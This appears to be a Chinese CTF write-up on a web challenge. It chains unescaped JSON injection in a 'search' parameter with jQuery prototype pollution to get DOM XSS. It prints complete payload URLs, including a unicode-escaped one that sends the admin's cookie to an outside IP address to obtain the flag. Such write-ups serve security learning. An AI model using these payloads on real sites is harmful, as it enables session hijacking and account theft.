通过fuzz可以知道search参数不会做任何处理就会被拼接到响应中的term中，这意味着我们可以通过双引号来逃逸出term从而操控result字段，结合下文中使用的jquery代码存在着原型链污染漏洞，可以通过原型链污染进而造成DOM XSS攻击。最后构造存在DOM XSS漏洞的链接并发送给后台管理员，获取到cookie。

 发送http://outworld.nese.team:7780/?search=","result":{"__proto__":{"id":"\u003e\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0033\u0029\u003b\u003c\u0021\u002d\u002d","title":123}},"a":"，成功触发```<script>alert(1233);<!--```

最后将searchnode的id属性污染成`><script>document.location='http://xxx.xxx.xxx.xxx:xxx/?x='+window;<!--`，并发送给后台管理员，使其访问本地的实验环境并将cookie发送到用户的服务器上，得到flag。
发送
```
url=http://localhost:8000/?search=%22,%22result%22:{%22__proto__%22:{%22id%22:%22\u003e\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0033\u0039\u002e\u0031\u0030\u0035\u002e\u0031\u0037\u0036\u002e\u0033\u0037\u003a\u0031\u0032\u0033\u0033\u0034\u002f\u003f\u0078\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065\u003b\u003c\u0021\u002d\u002d%22,%22title%22:123}},%22a%22:%22
```
